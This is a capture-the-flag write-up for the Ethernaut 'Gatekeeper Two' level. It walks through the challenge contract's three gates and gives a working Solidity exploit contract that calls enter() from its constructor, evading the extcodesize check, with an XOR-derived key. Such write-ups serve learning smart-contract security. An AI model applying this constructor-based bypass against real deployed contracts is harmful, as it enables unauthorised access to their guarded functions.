---
description: type conversion, extcodesize, and ^(xor)
---

# 14 - Gatekeeper Two

Ethernaut Level14: Gatekeeper Two

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### Goal of this level

* successfully calling enter function without revert

### What you should know before

* `^`(xor) operation
* type conversion\
  \-> see the explanation in [14 - Gatekeeper Two](https://frenchkebab.gitbook.io/ctf-solutions/ethernaut/14-gatekeeper-two)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

* code size is 0 when a contract is being deployed

<!---->

* An inverse operation of `^`(xor) is `^`(xor)!

</details>

#### gateTwo

```solidity
modifier gateTwo() {
  uint x;
  assembly { x := extcodesize(caller()) }
  require(x == 0);
  _;
}
```

\-> `excodesize(caller())` returns size of the code of `msg.sender`

This will revert if the code size is not zero, but  `gateOne` requires `msg.sender` to be a contract.

We can pass this by calling enter from the constructor of our exploit contract.

While constructor is running, code size of its contract is `0`.\
(because the contract **hasn't been deployed** yet)

#### gateThree

```solidity
modifier gateThree(bytes8 _gateKey) {
  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
  _;
}
```

`type(uint64).max` is `0xffffffffffffffff`.

Note that the inverse operation is xor, which means that when `a ^ b = c`, \
then `a = c ^ b`, `b = a ^ c` satisfies.

<pre class="language-solidity"><code class="lang-solidity"><strong>uint64(_gateKey) == uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max
</strong></code></pre>

So this condition is equivalent to the original condition.

`msg.sender` here will be the address of our exploit contract.

So we just can replace `msg.sender` to `address(this)` to calculate `_gateKey`.&#x20;



```solidity
contract AttackGatekeeperTwo {
    constructor(GatekeeperTwo _instanceAddr) {
        uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        _instanceAddr.enter(bytes8(_gateKey));
    }
}
```

Done! 😎

## Key Takeaway

* Inverse operation of `^`(xor) is `^`(xor)
* code size of the contract is `0` when `constructor` is running
